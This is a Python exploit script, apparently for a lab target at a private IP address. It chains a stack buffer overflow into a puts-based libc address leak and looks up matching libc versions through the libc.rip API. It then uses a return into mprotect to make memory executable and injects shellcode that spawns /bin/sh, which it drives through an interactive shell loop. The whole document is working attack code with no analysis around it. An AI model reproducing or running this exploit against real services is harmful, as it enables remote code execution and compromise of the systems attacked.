import requests
import json
from pwn import remote, u32, p32, log

# Static Configuration
CONN, PORT = '192.168.0.156', 9000
OUTPUT_LINES_BEFORE, OUTPUT_LINES_AFTER = 6, 2
BUFF_SIZE = 132
FIND_LIBC_URL = 'https://libc.rip/api/find'
LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
HEADERS = {'Content-Type': 'application/json'}

PLT_PUTS, PLT_GETS, MAIN_ADDR, GOT_PUTS = 0x8048340, 0x08048330, 0x804847b, 0x80497ac

SHELLCODE = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"


def leak_via_puts(conn, port,puts_got_addr):
    """
    Leaks randomised libc address via puts' PLT and function's GOT.
    """
    global proc
    proc = remote(conn,port)
    payload = b'A' * BUFF_SIZE + p32(PLT_PUTS) + p32(MAIN_ADDR) + p32(puts_got_addr)
    proc.sendline(payload)
    skip_lines(proc, OUTPUT_LINES_BEFORE)
    puts_addr = u32(proc.recv(4))
    skip_lines(proc, OUTPUT_LINES_AFTER)
    log.success(f"Leaked address of puts: {hex(puts_addr)}")
    return puts_addr


def skip_lines(proc, lines):
    for _ in range(lines):
        proc.recvline(timeout=0.05)


def attemptR2Libc_shellcode(putsOffset, mprotectOff):
    # Leak randomised libc puts addr
    putsAddr = leak_via_puts(CONN, PORT, GOT_PUTS)

    # Get lib base addr using putsOffset
    libc_address = putsAddr - putsOffset
    log.success(f'LIBC base: {hex(libc_address)}')
    
    codeAddr = libc_address
    
    #https://man7.org/linux/man-pages/man2/mprotect.2.html (Free Software Foundation, 2018)
    payload = b'A' * BUFF_SIZE + p32(mprotectOff+libc_address) + p32(MAIN_ADDR) + p32(codeAddr>>0xc<<0xc) + p32(0x21000) + p32(0x7)

    proc.sendline(payload)
    log.success(f"Changed protections for {hex(codeAddr>>0xc<<0xc)}-{hex((codeAddr>>0xc<<0xc)+0x21000)} to RWX with mprotect")

    # Write shellcode payload to the address found above now changed to be writeable and executable using gets(&codeAddr)
    # Then execute that shellcode upon return of that gets()
    payload = b'A' * BUFF_SIZE + p32(PLT_GETS) + p32(codeAddr) + p32(codeAddr)

    proc.sendline(payload)
    log.success(f"Called gets({hex(codeAddr)}) with {hex(codeAddr)} as return addr")

    # Input shellcode to gets so it is written to 'codeAddr' and then executed on return
    payload = b'\x90'*20 + SHELLCODE

    proc.sendline(payload)
    log.success(f"Sent shellcode to {hex(codeAddr)} via gets")

    # Recieve output of previous overflows to clear stdout
    output = b""
    while True:
        try:
            currline = proc.recv(timeout = 0.2)
            if len(currline)==0:
                break
            output+=currline
        except:
            break
    
    # Check if reverse shell was spawned then handle user input and output for the process
    return handle_reverse_shell()

def handle_reverse_shell():
    """
    Handles the reverse shell interaction with the process.
    """
    try:
        proc.sendline(b"whoami")
        print(proc.recv(timeout=0.1).decode('utf-8'))
        while True:
            command = input("$ ")
            proc.sendline(command.encode('utf-8'))
            print(proc.recv(timeout=0.2).decode('utf-8'))
    except EOFError:
        return 300


def find_potential_libcs(puts_addr):
    """
    Retrieves potential libc versions matching given offsets.
    """
    data = {"symbols": {"puts": hex(puts_addr)}}
    response = requests.post(FIND_LIBC_URL, headers=HEADERS, data=json.dumps(data))
    return response.json()


def get_libc_symbol_offsets(libc_id):
    """
    Retrieves offsets for essential libc symbols: 'puts', 'mprotect'.
    """
    libc_url = f"{LIBC_SEARCH_URL}{libc_id['id']}"
    response = requests.post(libc_url, headers=HEADERS, json={"symbols": ["puts", "mprotect"]})
    return response.json().get('symbols', {})

def main():
    putsAddr = leak_via_puts(CONN, PORT, GOT_PUTS)
    potential_libcs = find_potential_libcs(putsAddr)

    for libc in potential_libcs:
        offsets = get_libc_symbol_offsets(libc)
        puts_off, mprotect_off  = (int(offsets[sym], 16) for sym in ["puts", "mprotect"])   
        attemptR2Libc_shellcode(puts_off, mprotect_off)


if __name__ == "__main__":
    main()